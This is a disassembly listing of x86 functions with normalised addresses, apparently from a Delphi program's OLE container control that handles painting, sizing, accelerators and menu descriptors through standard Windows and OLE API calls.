mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
call sub_4611a0
sub eax 0xfffffd9c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x220 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465a03
lea eax [ ebp - 0x8 ]
call sub_405928
retn
push 0xffffffff
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
sub_465a0c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_465aee
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465af5
lea eax [ ebp - 0x10 ]
call sub_405928
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x248 ] 0x1
xor eax eax
push ebp
push sub_465ad1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x244 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x248 ] 0x0
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x244 ]
mov edx ebx
call sub_417570
mov edi eax
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_462658
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_465768
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov eax [ eax + 0x40 ]
mov eax [ eax + ebx * 4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
sub_465afc
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ ebp - 0x30 ]
mov edx [ r-xdata ]
call sub_4049a4
xor eax eax
push ebp
push sub_465ba3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4645f0
mov [ ebp - 0x10 ] esi
mov eax rw-data
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x1
mov [ ebp - 0x4 ] 0x1
cmp [ esi ] 0x9
je r-xdata
mov eax 0x8
mov eax 0x4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465baa
lea eax [ ebp - 0x30 ]
mov edx [ r-xdata ]
call sub_404a74
retn
lea edx [ ebp - 0x30 ]
call sub_461cec
push 0x0
lea edx [ ebp - 0x30 ]
push edx
push 0x0
lea edx [ ebp - 0x10 ]
push edx
push eax
push 0x0
mov eax [ rw-data ]
push eax
push edi
mov eax [ ebx + 0x224 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
test eax eax
je r-xdata
sub_465bd0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov [ ebp - 0x10 ] 0x8
mov eax edi
call sub_404e34
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_465c20
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax ebx
call sub_465afc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465c27
mov eax [ ebp - 0x8 ]
push eax
call SysFreeString
retn
sub_465c30
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax esi
call sub_456c04
mov edi eax
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
cmp esi [ edi + 0x27c ]
jne r-xdata
mov eax [ edi + 0x27c ]
test eax eax
je r-xdata
xor eax eax
mov [ edi + 0x27c ] eax
mov [ edi + 0x27c ] esi
jmp r-xdata
cmp esi eax
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_440e64
sub_465c80
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_465cce
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
mov edx edi
call sub_4132cc
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax ebx
call sub_465924
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465cd5
lea eax [ ebp - 0x10 ]
call sub_40edcc
retn
sub_465cdc
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov edi edx
mov ebx eax
mov [ esp ] 0x8
mov eax esi
xor edx edx
call sub_404890
je r-xdata
xor eax eax
mov [ esp + 0x8 ] eax
mov eax esi
call sub_404874
mov [ esp + 0x8 ] eax
jmp r-xdata
mov ecx esp
mov edx edi
mov eax ebx
call sub_465afc
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_465d20
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ecx ]
xor eax eax
push ebp
push j_sub_403788#2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
add eax 0x25f
cmp eax 0x7
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_465d55 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_4034e4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffe9
call sub_4034e4
jmp r-xdata
cmp [ ecx + 0x8 ] 0x2
jl r-xdata
cmp [ ecx + 0x8 ] 0x0
jle r-xdata
cmp [ ecx + 0x8 ] 0x4
jl r-xdata
lea eax [ ebx + 0x10 ]
call sub_40f770
mov [ ebp - 0xe ] ax
mov eax ebx
call sub_40f770
mov edi eax
sub esi 0xfffffda4
je r-xdata
mov eax ebx
call sub_40f770
mov [ ebp - 0xf ] al
lea edx [ ebp - 0xf ]
mov eax [ ebp - 0x4 ]
mov si 0xffba
call sub_4034e4
test [ ebx + 0x1 ] 0x40
je r-xdata
lea eax [ ebx + 0x30 ]
call sub_40f770
mov edi eax
and edi 0x7
lea eax [ ebx + 0x20 ]
call sub_40f770
and eax 0x7
mov [ ebp - 0xc ] eax
mov al [ edi + rw-data ]
mov [ ebp - 0x6 ] al
mov al [ edi + rw-data ]
mov edx [ ebp - 0xc ]
or al [ edx + rw-data ]
mov [ ebp - 0x5 ] al
lea eax [ ebx + 0x10 ]
call sub_40f770
mov edi eax
mov eax ebx
call sub_40f770
mov [ ebp - 0xc ] eax
sub esi 0xfffffda1
je r-xdata
and edi 0x7
mov cl [ edi + rw-data ]
lea edx [ ebp - 0xe ]
mov eax [ ebp - 0x4 ]
mov si 0xffbb
call sub_4034e4
sub esi 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
mov dl [ ebp - 0xf ]
mov [ eax ] dl
jmp r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
mov cl [ ebp - 0x5 ]
mov dl [ ebp - 0x6 ]
mov eax [ ebp - 0x4 ]
mov si 0xffd3
call sub_4034e4
dec esi
je r-xdata
mov eax [ ebx + 0x18 ]
mov dx [ ebp - 0xe ]
mov [ eax ] dx
jmp r-xdata
test [ ebx + 0x11 ] 0x40
je r-xdata
and edi 0x7
mov cl [ edi + rw-data ]
lea edx [ ebp - 0xe ]
mov eax [ ebp - 0x4 ]
mov si 0xffbc
call sub_4034e4
jmp r-xdata
mov eax [ ebp - 0xc ]
push eax
mov ecx edi
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffd4
call sub_4034e4
jmp r-xdata
dec esi
jne r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
mov cl [ ebp - 0x5 ]
mov dl [ ebp - 0x6 ]
mov eax [ ebp - 0x4 ]
mov si 0xffd5
call sub_4034e4
jmp r-xdata
sub_465f1c
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ esi ]
cmp eax 0xbd00
jb r-xdata
mov eax [ esi ]
sub eax 0xb008
je r-xdata
cmp eax 0xbd08
ja r-xdata
cmp [ ebx + 0x59 ] 0x0
je r-xdata
dec eax
je r-xdata
cmp [ ebx + 0x230 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_443eac
cmp [ ebx + 0x220 ] 0x0
je r-xdata
cmp [ ebx + 0x5a ] 0x0
je r-xdata
jmp r-xdata
mov eax ebx
call sub_4464d0
mov [ esp ] eax
mov eax [ esi ]
sub eax 0xbc00
mov [ esp + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x8 ] eax
mov eax [ esi + 0x8 ]
mov [ esp + 0xc ] eax
call GetMessageTime
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] 0x115de1f1
mov [ esp + 0x18 ] 0x115de1f1
push esp
mov eax [ ebx + 0x230 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
test eax eax
jne r-xdata
push 0xfffffd41
mov eax [ ebx + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
push 0xfffffd40
mov eax [ ebx + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
jmp r-xdata
cmp [ ebx + 0x220 ] 0x0
je r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
push 0xfffffd43
mov eax [ ebx + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
add esp 0x1c
pop esi
pop ebx
retn
sub_466004
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x214 ] 0x0
setne [ ebp - 0x5 ]
xor eax eax
push ebp
push j_sub_4038b4
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4660c3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call GlobalLock
mov ebx eax
xor eax eax
push ebp
push sub_4660a0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call GlobalSize
mov ecx eax
mov edx ebx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4660a7
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call GlobalUnlock
retn
mov eax [ ebp - 0x4 ]
call sub_464a80
sub_4660ca
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4660d9
add [ eax ] eax
add [ eax ] al
pop eax
jb r-xdata
retn
add ch ah
pushad
inc esi
add [ ecx - 0x742c743d ] cl
inc ebp
cld
mov ecx [ eax ]
call [ ecx + 0xd8 ]
test al al
jne r-xdata
call sub_403af0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_403a9c
sub_46610c
push esi
mov esi eax
test [ esi + 0x23d ] 0x4
jne r-xdata
mov eax esi
call sub_4448ec
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_46612c
push ebx
push esi
push edi
add esp 0xffffffb0
mov edi edx
mov ebx eax
test [ ebx + 0x23d ] 0x4
je r-xdata
mov edx edi
mov eax ebx
call sub_444628
mov esi [ edi + 0x4 ]
test esi esi
jne r-xdata
lea edx [ esp + 0x40 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x40 ]
push eax
push esi
push 0x1
mov eax [ ebx + 0x218 ]
push eax
call OleDraw
cmp [ edi + 0x4 ] 0x0
jne r-xdata
push esp
mov eax ebx
call sub_4464d0
push eax
call BeginPaint
mov esi eax
add esp 0x50
pop edi
pop esi
pop ebx
retn
push esp
mov eax ebx
call sub_4464d0
push eax
call EndPaint
jmp r-xdata
sub_46619c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax esi
call sub_456c04
mov edi eax
xor ebx ebx
mov eax edi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
test ebx ebx
je r-xdata
mov ebx edi
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp + 0x4 ]
push eax
mov eax [ esi + 0x230 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
cmp [ ebp + 0x4 ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push esi
call sub_466a3c
sub_4661f8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4459cc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x1
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x249 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4467d4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x249 ] 0x1
xor eax eax
push ebp
push sub_466271
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x70 ]
mov edx 0xfffffe0b
mov eax [ ebp - 0x4 ]
call sub_465730
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x249 ] 0x0
retn
sub_46627c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_445984
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x8
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24b ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4467d4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24b ] 0x1
xor eax eax
push ebp
push sub_4662fb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb ecx ecx
mov edx 0xfffffdfe
mov eax [ ebp - 0x4 ]
call sub_46584c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24b ] 0x0
retn
sub_466308
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4663fd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4459f4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x6
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466404
lea eax [ ebp - 0x14 ]
call sub_40edcc
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24a ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4467d4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24a ] 0x1
xor eax eax
push ebp
push sub_4663e0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov ecx [ eax + 0x18 ]
mov edx 0xfffffdff
mov eax [ ebp - 0x4 ]
call sub_465780
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24a ] 0x0
retn
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
call sub_4640b0
lea ecx [ ebp - 0x14 ]
mov edx 0xfffffe00
mov eax [ ebp - 0x4 ]
call sub_465c80
sub_466408
push ebx
push esi
push edi
add esp 0xffffffd0
mov edi edx
mov ebx eax
mov eax ebx
mov si 0xffb8
call sub_4034e4
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_445914
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
test eax eax
jne r-xdata
cmp [ esp + 0xc ] 0x0
je r-xdata
lea eax [ esp + 0x14 ]
xor ecx ecx
mov edx 0x1c
call sub_402cfc
mov eax ebx
call sub_4464d0
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] 0x100
mov eax [ edi + 0x4 ]
mov [ esp + 0x1c ] eax
mov eax [ edi + 0x8 ]
mov [ esp + 0x20 ] eax
push esp
lea eax [ esp + 0x18 ]
push eax
movzx eax [ esp + 0x14 ]
push eax
mov eax [ esp + 0x14 ]
push eax
call IsAccelerator
test eax eax
je r-xdata
lea eax [ esp + 0x14 ]
push eax
mov eax [ ebx + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ edi + 0xc ] 0x1
jmp r-xdata
add esp 0x30
pop edi
pop esi
pop ebx
retn
sub_4664c0
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_456c04
test eax eax
je r-xdata
mov edx esp
mov eax ebx
call sub_43f650
push esp
mov eax ebx
call sub_4462cc
push eax
push 0x0
mov eax ebx
test eax eax
je r-xdata
cmp ebx [ eax + 0x27c ]
je r-xdata
push eax
push 0x0
push 0xfffffffc
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x2c ]
sub eax 0xfffffd9c
add esp 0x10
pop ebx
retn
sub_466510
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_456c04
mov esi eax
test esi esi
je r-xdata
cmp [ ebx + 0x22c ] 0x0
je r-xdata
cmp ebx [ esi + 0x27c ]
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebx + 0x22c ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
pop esi
pop ebx
retn
cmp ebx [ esi + 0x220 ]
jne r-xdata
push 0x0
push ebx
call sub_466904
sub_466558
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_40339c
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_46660c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
push 0x1
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push 0x9ec
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call MulDiv
mov esi eax
push 0x9ec
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call MulDiv
mov edi eax
test [ ebx + 0x23d ] 0x4
je r-xdata
push esi
push edi
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
cmp esi 0x20
jle r-xdata
cmp edi 0x20
jle r-xdata
mov esi 0x20
mov edi 0x20
sub_4666e0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
test [ ebp + 0x14 ] 0x4
je r-xdata
fld [ esi ]
fmul [ r-xdata ]
mov eax [ rw-data ]
mov eax [ eax ]
fild [ eax + 0x40 ]
fdivp st1
call sub_402b18
mov [ ebx ] eax
fld [ esi + 0x4 ]
fmul [ r-xdata ]
mov eax [ rw-data ]
mov eax [ eax ]
fild [ eax + 0x40 ]
fdivp st1
call sub_402b18
mov [ ebx + 0x4 ] eax
push 0x9ec
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebx ]
push eax
call MulDiv
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x4 ]
fstp [ esi ]
fwait
push 0x9ec
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call MulDiv
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x4 ]
fstp [ esi + 0x4 ]
fwait
jmp r-xdata
xor eax eax
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
sub_4667b0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
xor edi edi
mov eax ebx
call sub_4462cc
mov [ esi ] eax
cmp [ esi ] 0x0
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov edi 0x80004005
sub_4667e8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x22c ]
call sub_405928
push eax
push r-xdata
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax ]
lea eax [ ebx + 0x230 ]
call sub_405928
push eax
push r-xdata
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax ]
xor eax eax
pop ebx
pop ebp
retn 0x4
sub_46682e
add [ eax ] al
adc eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
pop ss
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov dl 0x1
call sub_465c30
xor eax eax
pop ebp
retn 0x4
sub_466864
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor edx edx
mov [ eax ] edx
mov eax [ ebp + 0xc ]
mov edx ebx
test edx edx
je r-xdata
xor edx edx
mov [ eax ] edx
call sub_405940
mov eax [ ebp + 0x10 ]
call sub_405928
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_43f650
mov eax [ ebp + 0x14 ]
push esi
lea esi [ ebp - 0x10 ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0x7fff
push 0x7fff
push 0x0
push 0x0
mov eax [ ebp + 0x18 ]
push eax
call SetRect
xor eax eax
mov [ esi + 0x4 ] eax
mov eax ebx
call sub_4462e4
mov [ esi + 0x8 ] eax
xor eax eax
mov [ esi + 0xc ] eax
xor eax eax
mov [ esi + 0x10 ] eax
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub edx 0xfffffda8
sub_466904
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push 0x0
push 0x0
push 0x0
push ebx
call sub_466a3c
xor edx edx
mov eax ebx
call sub_465c30
xor eax eax
pop ebx
pop ebp
retn 0x8
sub_4669fc
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ ebp + 0x8 ]
call sub_464f24
test eax eax
je r-xdata
xor eax eax
mov esp ebp
pop ebp
retn 0xc
push 0x2
mov edx [ ebp + 0x10 ]
push edx
push 0x5
xor edx edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] 0x2
mov [ ebp - 0x4 ] 0x4
lea ecx [ ebp - 0xc ]
mov edx [ ebp + 0xc ]
call sub_453d4c
sub_466a3c
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
call sub_464f24
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn 0x10
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_453d9c
push 0x0
push 0x0
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebx + 0x38 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call OleSetMenuDescriptor
sub_466b40
inc edi
insb
inc esi
add [ esp + ebp * 2 ] bh
inc esi
add [ edx + 0x6c ] dl
inc esi
add [ ecx ] dh
insb
inc esi
add [ esi ] ah
insb
inc esi
add [ esi ] dl
insb
inc esi
add [ ebx ] al
insb
inc esi
add [ edx + 0x6c ] dl
inc esi
add [ edx + 0x6c ] dl
inc esi
add al bh
imul eax [ esi ] 0xffffffe6
imul eax [ esi ] 0xffffffd5
imul eax [ esi ] 0xffffffa7
imul eax [ esi ] 0xffffff8d
imul eax [ esi ] 0x7c
imul eax [ esi ] 0xffffff8b
retn
sub_466ba7
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
mov esi [ esi + 0x68 ]
cmp [ esi + 0x59 ] 0x0
je r-xdata
mov esi [ eax + 0x68 ]
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_4640b0
lea edx [ ebp - 0x20 ]
mov eax ebx
call sub_40f0e0
jmp sub_466c5e
sub_466c94
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_466e98
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push j_sub_4038b4#3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0xc ]
sub eax 0xfffffdfe
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x24b ] 0x0
jne r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24b ] 0x1
xor eax eax
push ebp
push sub_466d97
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xfffffdfe
mov eax [ ebp + 0x8 ]
call sub_464f74
cmp ax 0x1
sbb edx edx
inc edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24b ] 0x0
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x24a ] 0x0
jne r-xdata
dec eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466e9f
lea eax [ ebp - 0x10 ]
call sub_40edcc
retn
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24a ] 0x1
xor eax eax
push ebp
push sub_466e59
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xfffffdff
mov eax [ ebp + 0x8 ]
call sub_464f10
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x68 ]
call sub_42046c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24a ] 0x0
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x24a ] 0x0
jne r-xdata
sub eax 0xb
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24a ] 0x1
xor eax eax
push ebp
push sub_466dfc
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov edx 0xfffffe00
mov eax [ ebp + 0x8 ]
call sub_465178
lea eax [ ebp - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x68 ]
call sub_4640fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24a ] 0x0
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x249 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x249 ] 0x1
xor eax eax
push ebp
push sub_466d34
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xfffffe0b
mov eax [ ebp + 0x8 ]
call sub_464f10
mov edx eax
mov eax [ ebp + 0x8 ]
call sub_43fe50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x249 ] 0x0
retn
sub_466ed0
push ebp
mov ebp esp
xor eax eax
